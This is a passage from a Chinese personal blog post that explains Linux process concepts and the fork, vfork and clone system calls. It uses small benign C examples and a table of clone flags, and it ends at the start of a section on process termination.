<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="参考：linux进程相关函数(获取、销毁、切换···)_储处理器执行的代码-CSDN博客 参考：fork()、vfork()、clone()的区别_linux clone fork-CSDN博客 0x1 从C函数走进子进程1.1 进程有关概念1.1.1 进程程序是指存放指令的文件，存放在磁盘上，它是固定不变的，保存着指令的有序集合 进程是动起来的概念，可以理解成动起来的程序。（回头看看程序员自我修">
<meta property="og:type" content="article">
<meta property="og:title" content="紫禁城之殇">
<meta property="og:url" content="http://example.com/2024/10/28/%E7%B4%AB%E7%A6%81%E5%9F%8E%E4%B9%8B%E6%AE%87/index.html">
<meta property="og:site_name" content="xswlhhh的黄金屋">
<meta property="og:description" content="参考：linux进程相关函数(获取、销毁、切换···)_储处理器执行的代码-CSDN博客 参考：fork()、vfork()、clone()的区别_linux clone fork-CSDN博客 0x1 从C函数走进子进程1.1 进程有关概念1.1.1 进程程序是指存放指令的文件，存放在磁盘上，它是固定不变的，保存着指令的有序集合 进程是动起来的概念，可以理解成动起来的程序。（回头看看程序员自我修">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725447425374-34f85d01-61b6-41b4-993d-3739f43bc4f8.jpeg">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725449684249-0afc3bac-80fa-4891-a4ca-8d52230e81f1.jpeg">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725520062487-a9289a68-c329-4311-a2e5-f3653491e751.png">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725521534710-ecc3e4f3-3a59-455a-8518-4ee9832628ef.png">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725521563404-2340e616-ddce-4047-b31e-be1016202d38.png">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725523442460-5ab430b5-a6d0-4ab7-8010-b0217c4f5162.png">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725531833655-06cbd253-9b05-4082-a266-3f368db9af93.png">
<meta property="og:image" content="e:\blog_images\1726049231841-1a5c4bdc-96e3-4ed7-9886-a2bdb6dc14b6.jpeg">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726108227781-e82be599-1ad7-4755-839b-734eb69d8d50.jpeg">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1724511366296-7019bbcc-9ce3-46b8-bea3-c939ba7f99f9.png">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726111417293-c9c0dab2-a03b-43ef-8077-3c444b56027c.png">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726211709806-93e54516-2188-475d-b6d6-26cbd6a1af77.png">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726212749197-6b4ebf41-fb80-4677-a0a3-5d0bfe0553e9.png">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726214096416-98d3111d-f787-43c9-9d9c-0f0766b4dae1.png">
<meta property="og:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726214453067-8e33a529-ea32-4953-bdab-46d9de921250.png">
<meta property="article:published_time" content="2024-10-28T03:35:38.000Z">
<meta property="article:modified_time" content="2024-11-04T07:12:44.997Z">
<meta property="article:author" content="xswlhhh">
<meta property="article:tag" content="进程">
<meta property="article:tag" content="二进制知识">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725447425374-34f85d01-61b6-41b4-993d-3739f43bc4f8.jpeg">

<link rel="canonical" href="http://example.com/2024/10/28/%E7%B4%AB%E7%A6%81%E5%9F%8E%E4%B9%8B%E6%AE%87/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>紫禁城之殇 | xswlhhh的黄金屋</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">xswlhhh的黄金屋</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/archives" rel="section"><i class="home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/28/%E7%B4%AB%E7%A6%81%E5%9F%8E%E4%B9%8B%E6%AE%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/myavatar.jpg">
      <meta itemprop="name" content="xswlhhh">
      <meta itemprop="description" content="用最少的时间做无关的事，用最多的时间做紧要的事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xswlhhh的黄金屋">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          紫禁城之殇
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-28 11:35:38" itemprop="dateCreated datePublished" datetime="2024-10-28T11:35:38+08:00">2024-10-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-04 15:12:44" itemprop="dateModified" datetime="2024-11-04T15:12:44+08:00">2024-11-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">ctf知识</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>41k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>37 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/z961968549/article/details/80189737#:~:text=%E5%BD%93%E6%9F%90%E4%B8%AA%E8%BF%9B%E7%A8%8B%E6%94%B6%E5%88%B0%E4%BF%A1%E5%8F%B7%E6%97%B6#:~:text=%E5%BD%93%E6%9F%90%E4%B8%AA%E8%BF%9B%E7%A8%8B%E6%94%B6%E5%88%B0%E4%BF%A1%E5%8F%B7%E6%97%B6">linux进程相关函数(获取、销毁、切换···)_储处理器执行的代码-CSDN博客</a></p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/gogokongyin/article/details/51178257">fork()、vfork()、clone()的区别_linux clone fork-CSDN博客</a></p>
<h1 id="0x1-从C函数走进子进程"><a href="#0x1-从C函数走进子进程" class="headerlink" title="0x1 从C函数走进子进程"></a>0x1 从C函数走进子进程</h1><h2 id="1-1-进程有关概念"><a href="#1-1-进程有关概念" class="headerlink" title="1.1 进程有关概念"></a>1.1 进程有关概念</h2><h3 id="1-1-1-进程"><a href="#1-1-1-进程" class="headerlink" title="1.1.1 进程"></a>1.1.1 进程</h3><p>程序是指存放指令的文件，存放在磁盘上，它是固定不变的，保存着指令的有序集合</p>
<p>进程是动起来的概念，可以理解成动起来的程序。（回头看看程序员自我修养是如何解释的）</p>
<p>进程时程序的执行过程，它一般分为三种状态：</p>
<p><strong>执行态</strong>：该进程正在运行，即正在使用CPU</p>
<p><strong>就绪态</strong>：该进程已经具备执行的一切条件，正在等待分配CPU的处理</p>
<p><strong>等待态</strong>：进程不能使用CPU，若等待事件发生（等待的资源分配到自身），将其唤醒。</p>
<p>进程的标识号是pid，它来区分不同的进程。</p>
<p>进程0调度进程时，常被称为交换进程，他不执行任何程序，是内核的一部分，因此被称为系统进程。进程除了自身ID外，还有父进程ID，每个进程都有一个父进程，操作系统不会无缘无故产生一个新进程<strong>。所有进程的祖先进程都是同一个进程叫做init进程，进程号是1。init进程是内核自举后的第一个启动进程</strong></p>
<p>iniit进程负责引导系统、启动守护（后台）进程并且运行必要的程序。<strong>它不是系统进程但是它以系统的超级用户特权运行。</strong></p>
<p><strong>父进程负责子进程空间的清理</strong></p>
<p><strong>并发</strong>：宏观上来看，只是因为执行速度快，看起来所有事情同时发生</p>
<p><strong>并行</strong>：同时执行，微观上真的同时执行，多个CPU同时执行不同的进程，多个进程真的在同时执行。</p>
<p><strong>同步</strong>：相同的步伐，进程间相互联系，或者共同完成某件事，需要相互协调</p>
<p><strong>异步</strong>：不同的步伐，进程间毫无关联。</p>
<p>从参考文献中读到这么一句话，发现对进程的描述很恰当。</p>
<p>Linux中，一个人在炒菜，快递打电话来了，让这个人去取快递，他可以叫他的儿子去取快递，自己继续炒菜。从CPU角度来想，由于CPU执行速度较快，看起来任务同时进行（并发进行），这样所有的事情都不耽误，这就是进程的意义。</p>
<h3 id="1-1-2-进程和线程的区别？"><a href="#1-1-2-进程和线程的区别？" class="headerlink" title="1.1.2 进程和线程的区别？"></a>1.1.2 进程和线程的区别？</h3><p>​      进程的四要素：</p>
<p>​       （1）有一段程序供其执行（不一定是一个进程所专有的），就像一场戏必须有自己的剧本。<br>​       （2）有自己的专用系统堆栈空间（私有财产）<br>​       （3）有进程控制块（task_struct）（“有身份证，PID”）<br>​       （4）有独立的存储空间。<br>​          缺少第四条的称为线程，如果完全没有用户空间称为内核线程，共享用户空间的称为用户线</p>
<h2 id="1-2-从C语言函数出发"><a href="#1-2-从C语言函数出发" class="headerlink" title="1.2 从C语言函数出发"></a>1.2 从C语言函数出发</h2><hr>
<h3 id="1-2-1-获取进程ID"><a href="#1-2-1-获取进程ID" class="headerlink" title="1.2.1 获取进程ID"></a>1.2.1 获取进程ID</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="type">void</span>)</span></span>; </span><br></pre></td></tr></table></figure>

<p><strong>功能：</strong>获取自己的进程<code>ID</code>号<br><strong>参数：</strong>无<br><strong>返回值：</strong>本进程的<code>ID</code>号</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>功能：</strong>获取自己的父进程<code>ID</code>号<br><strong>参数：</strong>无<br><strong>返回值：</strong>本进程的父进程的<code>ID</code>号</p>
<hr>
<h3 id="1-2-2-创建进程"><a href="#1-2-2-创建进程" class="headerlink" title="1.2.2 创建进程"></a>1.2.2 创建进程</h3><p>创建进程主要有三个函数fork vfork clone它们其实都是linux的系统调用，这三个函数分别调用了sys_fork、sys_vfork、sys_clone最终都调用了do_fork函数，差别在于参数的传递和一些基本的准备工作不同。</p>
<h4 id="1-2-2-1-fork"><a href="#1-2-2-1-fork" class="headerlink" title="1.2.2.1 fork"></a>1.2.2.1 fork</h4><p>生成一个进程，实际上是把父进程的资源task_struct，除了进程号。</p>
<p>fork只调用一次，但是会在父进程和子进程中分别返回两次，<strong>父进程中返回所创建子进程的pid</strong>，<strong>子进程中返回0</strong>。在fork()结束后，<strong>父进程和子进程的执行顺序不确定（基本是同步运行）</strong>，由高度程序决定谁先执行。<strong>不过可以在父进程中调用wait(）等待子进程结束。</strong></p>
<p>说到fork，得提到写时拷贝技术</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725447425374-34f85d01-61b6-41b4-993d-3739f43bc4f8.jpeg" alt="img"></p>
<p>我们都知道fork创建进程的时候，并没有真正的copy内存，因为对于fork来说，有一个exec系列的系统调用，它会勾引子进程另起炉灶。为了不让copy内存造成效率降低，linux引入了“写时复制技术”</p>
<p>换而言之，fork()之后exec之前两个进程用的是相同的物理空间（代码段、数据段、堆栈，仅仅是虚拟空间不同）。当父进程中有更改相应段的行为发生，如果不是因为exec产生，内核会给子进程的相应位置分配物理空间，但是代码段继续共享父进程的物理空间。如果是因为exec，由于两者执行的代码不同，子进程代码段也会分配单独的物理空间。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork()) &#123;               <span class="comment">/* parent */</span></span><br><span class="line">        <span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In parent\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                    <span class="comment">/* child */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In child\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-2-2-2-vfork"><a href="#1-2-2-2-vfork" class="headerlink" title="1.2.2.2 vfork"></a>1.2.2.2 vfork</h4><p>我们从vfork()的产生原因来理解它会比较容易，因为fork()操作会将当前进程的任何资源几乎完全复制一份，其中包括了地址空间。一般fork()调用后都会跟着调用execve()，用新的内存镜像取代原来的内存镜像，当地址空间很大的时候，复制的操作会很费时，而且又是无用功，所以就产生了vfork。</p>
<p><code>vfork()</code>产生的子进程与父进程共享地址空间（代码段，数据段，堆栈），就没有了复制产生的开销。而且pid也是相同的。<br><code>vfork()</code>保证父进程在子进程调用<code>execve()</code>或<code>exit()</code>之前不会执行。</p>
<p>创建出来的进程不是真正意义上的进程，而是一个线程</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count before fork = %d\n&quot;</span>, count);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">vfork</span>()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In parent: count = %d\n&quot;</span>, count);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In child:  count = %d\n&quot;</span>, ++count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意程序不能使用<code>return</code>语句退出（至少子进程不能使用），原因我猜测是<br><code>return</code>语句会使得<code>main</code>函数的栈被清空，因为是使用的同一个内存空间，子进程<br>把栈清空后，父进程的栈就被破坏了，于是就出错了。使用<code>exit()</code>可以避免这个问题。</p>
<h4 id="1-2-2-3-clone"><a href="#1-2-2-3-clone" class="headerlink" title="1.2.2.3 clone()"></a>1.2.2.3 clone()</h4><p>clone（）可以更细粒度与子进程共享资源，因而参数也更复杂，函数原型如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">clone</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *child_stack,</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="type">int</span> flags, <span class="type">void</span> *arg, ...</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="comment">/* pid_t *ptid, struct user_desc *tls, pid_t *ctid */</span> )</span></span>;</span><br></pre></td></tr></table></figure>

<p>根据man 2 clone上的描述，这个原型并不是最底层的调用，而是封装过的。</p>
<p>这里第一个参数fn是函数指针，我们知道进程的4要素，这个就是指向程序的指针，就是“剧本”</p>
<p>child_stack明显是为子进程分配系统堆栈空间（在linux下系统堆栈空间是2页面，就是8K的内存，其中在这块内存中，低地址上放入了值，这个值就是进程控制块task_struct的值），flags就是标志用来描述你需要从父进程继承那些资源， arg就是传给子进程的参数）。下面是flags可以取的值</p>
<table>
<thead>
<tr>
<th><strong>标志</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>CLONE_PARENT</td>
<td>创建的子进程的父进程是调用者的父进程，新进程与创建它的进程成了“兄弟”而不是“父子”</td>
</tr>
<tr>
<td>CLONE_FS</td>
<td>子进程与父进程共享相同的文件系统，包括root、当前目录、umask</td>
</tr>
<tr>
<td>CLONE_FILES</td>
<td>子进程与父进程共享相同的文件描述符（file descriptor）表</td>
</tr>
<tr>
<td>CLONE_NEWNS</td>
<td>在新的namespace启动子进程，namespace描述了进程的文件hierarchy</td>
</tr>
<tr>
<td>CLONE_SIGHAND</td>
<td>子进程与父进程共享相同的信号处理（signal handler）表</td>
</tr>
<tr>
<td>CLONE_PTRACE</td>
<td>若父进程被trace，子进程也被trace</td>
</tr>
<tr>
<td>CLONE_VFORK</td>
<td>父进程被挂起，直至子进程释放虚拟内存资源</td>
</tr>
<tr>
<td>CLONE_VM</td>
<td>子进程与父进程运行于相同的内存空间</td>
</tr>
<tr>
<td>CLONE_PID</td>
<td>子进程在创建时PID与父进程一致</td>
</tr>
<tr>
<td>CLONE_THREAD</td>
<td>Linux 2.4中增加以支持POSIX线程标准，子进程与父进程共享相同的线程群</td>
</tr>
</tbody></table>
<p>下面的例子是创建一个线程（子进程共享了父进程虚存空间，没有自己独立的虚存空间不能称其为进程）。父进程被挂起当子线程释放虚存资源后再继续执行。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIBER_STACK 8192</span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">void</span> * stack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">do_something</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is son, the pid is:%d, the a is: %d\n&quot;</span>, <span class="built_in">getpid</span>(), ++a);</span><br><span class="line">    <span class="built_in">free</span>(stack); <span class="comment">//这里我也不清楚，如果这里不释放，不知道子线程死亡后，该内存是否会释放，知情者可以告诉下,谢谢</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">void</span> * stack;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    stack = <span class="built_in">malloc</span>(FIBER_STACK);<span class="comment">//为子进程申请系统堆栈</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!stack)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The stack failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;creating son thread!!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clone</span>(&amp;do_something, (<span class="type">char</span> *)stack + FIBER_STACK, CLONE_VM|CLONE_VFORK, <span class="number">0</span>);<span class="comment">//创建子线程</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is father, my pid is: %d, the a is: %d\n&quot;</span>, <span class="built_in">getpid</span>(), a);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725449684249-0afc3bac-80fa-4891-a4ca-8d52230e81f1.jpeg" alt="img"></p>
<hr>
<h2 id="1-3-出发的转折点"><a href="#1-3-出发的转折点" class="headerlink" title="1.3 出发的转折点"></a>1.3 出发的转折点</h2><p>上面是我们用C语言最基本的进程创建函数。然而进程还有很多关联的东西，比如进程资源的销毁和释放，system和exec和进程的关系，比如每个进程背后的&#x2F;proc&#x2F;pid&#x2F;文件，比如ptrace和wait对进程的追踪和阻塞。为了我们更好的走进子进程，我们一步一步来看这些问题。</p>
<hr>
<h2 id="1-4-销毁进程"><a href="#1-4-销毁进程" class="headerlink" title="1.4 销毁进程"></a>1.4 销毁进程</h2><p>进程的常见的终止方式有5种：</p>
